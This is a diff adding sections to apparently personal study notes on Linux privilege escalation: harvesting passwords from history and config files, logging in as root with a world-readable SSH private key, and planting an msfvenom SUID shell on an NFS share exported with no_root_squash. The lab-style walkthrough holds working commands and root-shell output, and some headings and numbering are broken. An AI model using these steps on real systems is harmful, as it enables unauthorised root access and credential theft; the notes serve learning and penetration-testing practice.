@@ -209,11 +209,27 @@ Hacking linux
   - [Abusing Shell Features 1](#Abusing-Shell-Features-1)
   - [Abusing Shell Features 2](#Abusing-Shell-Features-2)
 - [Passwords and Keys](#Passwords-and-Keys)
+  - [Passwords](#Passwords)
+  - [History Files](#History-Files)
+  - [Config Files](#Config-Files)
+  - [SSH Keys](#SSH-Keys)
+- [nfs](#nfs)
+  - [Useful Commands 2](#Useful-Commands-2)
+  - [Root Squashing](#Root-Squashing)
+  - [no root squash](#no-root-squash)
+- [Privilege Escalation Strategy](#Privilege-Escalation-Strategy)
+  - [Enumeration](#Enumeration)
+  - [Strategy](#Strategy)
+  - [](#)
+  - [](#)
+  - [](#)
+  - [](#)
+  - [](#)
   
 -------------------------------------------------------------------------------------------------------------------------------------------------------
 - [Linux Privilige Escalation 1](#Linux-Privilige-Escalation-1)
   - [Automated Enumeration Tools](#Automated-Enumeration-Tools)
-  - [Enumeration](#Enumeration)
+  - [Enumeration 2](#Enumeration-2)
   - [Privilege Escalation Kernel Exploits](#Privilege-Escalation-Kernel-Exploits)
   - [Privilege Escalation Sudo](#Privilege-Escalation-Sudo)
   - [Privilege Escalation SUID](#Privilege-Escalation-SUID)
@@ -3871,6 +3887,268 @@ ugdev),1000(user)
 ```
 
 ## Passwords and Keys
+
+## Passwords
+While it might seem like a long shot, weak password storage and
+password re-use can be easy ways to escalate privileges.
+While the root user’s account password is hashed and stored
+securely in /etc/shadow, other passwords, such as those for
+services may be stored in plaintext in config files.
+If the root user re-used their password for a service, that password
+may be found and used to switch to the root user.
+
+## History Files
+History files record commands issued by users while they are
+using certain programs.
+If a user types a password as part of a command, this password
+may get stored in a history file.
+It is always a good idea to try switching to the root user with a
+discovered password.
+
+
+## Privilege Escalation
+1.
+View the contents of hidden files in the user’s home
+directory with filenames ending in “history”:
+```
+$ cat ~/.*history | less
+ls -al
+cat .bash_history
+ls -al
+mysql -h somehost.local -uroot -ppassword123
+```
+It appears that the user connected to a MySQL server as the
+root user using the password “password123”.
+
+
+2. Use the su command to switch to the root user
+account, using the password found in the history
+file:
+```
+$ su root
+Password:
+root@debian:/home/user# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+## Config Files
+Many services and programs use configuration (config) files to
+store settings.
+If a service needs to authenticate to something, it might store the
+credentials in a config file.
+If these config files are accessible, and the passwords they store are
+reused by privileged users, we may be able to use it to log in as that
+user.
+
+## .
+List the contents of the user’s home directory:
+```
+$ ls
+myvpn.ovpn
+```
+2.
+tools
+View the contents of the myvpn.ovpn config file:
+```
+$ cat myvpn.ovpn
+...
+auth-user-pass /etc/openvpn/auth.txt
+...
+```
+The auth-user-pass option in OpenVPN allows for the plaintext storage of
+credentials in a file (/etc/openvpn/auth.txt).
+
+
+
+rivilege Escalation
+3.
+View the contents of the /etc/openvpn/auth.txt file:
+```
+$ cat /etc/openvpn/auth.txt
+root
+password123
+```
+4.
+Use the su command to switch to the root user account, using the
+password found in the auth.txt file:
+```
+$ su root
+Password:
+root@debian:/home/user# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+## SSH Keys
+SSH keys can be used instead of passwords to authenticate
+users using SSH.
+SSH keys come in pairs: one private key, and one public key.
+The private key should always be kept secret.
+If a user has stored their private key insecurely, anyone who
+can read the key may be able to log into their account using it.
+
+## Privilege Escalation
+1.
+A hidden directory (.ssh) exists in the system root directory. View the contents of
+this directory:
+```
+$ ls -l /.ssh
+total 4
+-rw-r--r-- 1 root root 1679 Aug 19 06:56 root_key
+```
+The file root_key is world-readable.
+2.
+View the contents of the root_key file:
+```
+$ cat /.ssh/root_key
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEA3IIf6Wczcdm38MZ9+QADSYq9FfKfwj0mJaUteyJHWHZ3/GNm
+```
+
+## Copy the root_key file to your local machine and correct its
+permissions so SSH will accept it:
+```
+$ chmod 600 root_key
+```
+4.
+Use the key to connect to the SSH server as the root user:
+```
+$ ssh -i root_key root@192.168.1.25
+...
+root@debian:~# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+## nfs
+
+NFS (Network File System) is a popular distributed file system.
+NFS shares are configured in the /etc/exports file.
+Remote users can mount shares, access, create, modify files.
+By default, created files inherit the remote user’s id and group id
+(as owner and group respectively), even if they don’t exist on the
+NFS server.
+
+## Useful Commands 2
+Show the NFS server’s export list:
+```
+$ showmount -e <target>
+```
+Similar Nmap script:
+```
+$ nmap –sV –script=nfs-showmount <target>
+```
+Mount an NFS share:
+```
+$ mount -o rw,vers=2 <target>:<share> <local_directory>
+```
+
+## Root Squashing
+Root Squashing is how NFS prevents an obvious privilege
+escalation.
+If the remote user is (or claims to be) root (uid=0), NFS will
+instead “squash” the user and treat them as if they are the
+“nobody” user, in the “nogroup” group.
+While this behavior is default, it can be disabled!
+
+
+## no root squash
+no_root_squash is an NFS configuration option which
+turns root squashing off.
+When included in a writable share configuration, a
+remote user who identifies as “root” can create files on
+the NFS share as the local root user.
+
+
+## Privilege Escalation
+1.
+Check the contents of /etc/exports for shares with the
+no_root_squash option:
+```
+$ cat /etc/exports
+...
+/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
+```
+2.
+Confirm that the NFS share is available for remote mounting:
+```
+$ showmount -e 192.168.1.25
+Exports list on 192.168.1.25:
+/tmp
+```
+
+3.
+Create a mount point on your local machine and mount the /tmp
+NFS share:
+```
+# mkdir /tmp/nfs
+# mount -o rw,vers=2 192.168.1.25:/tmp /tmp/nfs
+```
+4.
+Using the root user on your local machine, generate a payload and
+save it to the mounted share:
+```
+# msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o
+/tmp/nfs/shell.elf
+```
+5.
+Make sure the file has the SUID bit set, and is executable by
+everyone:
+```
+# chmod +xs /tmp/nfs/shell.elf
+```
+6.
+On the target machine, execute the file to get a root shell:
+```
+$ /tmp/shell.elf
+bash-4.1# id
+uid=1000(user) gid=1000(user) euid=0(root) egid=0(root)
+```
+
+## Privilege Escalation Strategy
+
+## Enumeration
+1. Check your user (id, whoami).
+2. Run Linux Smart Enumeration with increasing levels.
+3. Run LinEnum & other scripts as well!
+4. If your scripts are failing and you don’t know why, you can always run
+the manual commands from this course, and other Linux PrivEsc
+cheatsheets online (e.g. https://blog.g0tmi1k.com/2011/08/basic-
+linux-privilege-escalation/)
+
+## Strategy
+Spend some time and read over the results of your
+enumeration.
+If Linux Smart Enumeration level 0 or 1 finds something
+interesting, make a note of it.
+Avoid rabbit holes by creating a checklist of things you need
+for the privilege escalation method to work.
+
+Have a quick look around for files in your user’s home
+directory and other common locations (e.g.
+/var/backup, /var/logs).
+If your user has a history file, read it, it may have
+important information like commands or even
+passwords.
+
+Try things that don’t have many steps first, e.g. Sudo, Cron
+Jobs, SUID files.
+Have a good look at root processes, enumerate their versions
+and search for exploits.
+Check for internal ports that you might be able to forward to
+your attacking machine.
+
+If you still don’t have root, re-read your full enumeration
+dumps and highlight anything that seems odd.
+This might be a process or file name you aren’t familiar with,
+an “unusual” filesystem configured (on Linux, anything that
+isn’t ext, swap, or tmpfs), or even a username.
+At this stage you can also start to think about Kernel Exploits.
+
+## Don’t Panic
+Privilege Escalation is tricky.
+Practice makes perfect.
+Remember: in an exam setting, it might take a while to
+find the method, but the exam is always intended to be
+completed within a timeframe. Keep searching!
 ---------------------------------------------------------------------------------------------------------------------------------------------------------
 
 ## Linux Privilige Escalation 1
@@ -3890,7 +4168,7 @@ The target system’s environment will influence the tool you will be able to us
 *    Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration
 *    Linux Priv Checker: https://github.com/linted/linuxprivchecker 
 
-# Enumeration
+# Enumeration 2
 
 #### hostname
 
